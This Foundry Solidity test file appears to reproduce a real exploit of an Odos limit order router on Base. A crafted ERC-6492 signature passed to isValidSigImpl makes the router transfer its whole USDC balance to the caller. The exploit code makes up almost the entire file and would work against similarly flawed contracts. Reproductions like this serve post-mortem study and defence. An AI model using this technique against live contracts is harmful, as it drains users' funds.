// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~50k
// Attacker : https://basescan.org/address/0x4015d786e33c1842c3e4d27792098e4a3612fc0e
// Attack Contract : https://basescan.org/address/0x22a7da241a39f189a8aec269a6f11a238b6086fc
// Vulnerable Contract : https://basescan.org/address/0xb6333e994fd02a9255e794c177efbdeb1fe779c7
// Attack Tx : https://basescan.org/tx/0xd10faa5b33ddb501b1dc6430896c966048271f2510ff9ed681dd6d510c5df9f6

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xb6333e994fd02a9255e794c177efbdeb1fe779c7#code

// @Analysis
// Post-mortem : 
// Twitter Guy : https://x.com/Phalcon_xyz/status/1882630151583981787
// Hacking God : 

interface OdosLimitOrderRouter {
    function isValidSigImpl(
        address _signer,
        bytes32 _hash,
        bytes calldata _signature,
        bool allowSideEffects
    ) external returns (bool);
}

contract ContractTest is Test {
    OdosLimitOrderRouter odosLimitOrderRouterInstance =
        OdosLimitOrderRouter(0xB6333E994Fd02a9255E794C177EfBDEB1FE779C7);
    IUSDC USDCInstance = IUSDC(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    bytes32 ERC6492_DETECTION_SUFFIX = bytes32(hex"6492649264926492649264926492649264926492649264926492649264926492");

    function setUp() public {
        vm.createSelectFork("base", 25431001 - 1);

        vm.label(address(odosLimitOrderRouterInstance), "OdosLimitOrderRouter");
        vm.label(address(USDCInstance), "USDC");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker USDC balance before exploit",
            USDCInstance.balanceOf(address(this)),
            6
        );

        uint256 victimUSDCBalance = USDCInstance.balanceOf(address(odosLimitOrderRouterInstance));

        bytes memory customCalldata = abi.encodeCall(IUSDC.transfer, (address(this), victimUSDCBalance));
        bytes memory signature = abi.encodePacked(
            abi.encode(address(USDCInstance), customCalldata, bytes(hex"01")),
            ERC6492_DETECTION_SUFFIX
        );

        odosLimitOrderRouterInstance.isValidSigImpl(address(0x04), bytes32(0x0), signature, true);

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance before exploit",
            USDCInstance.balanceOf(address(this)),
            6
        );
    }
}
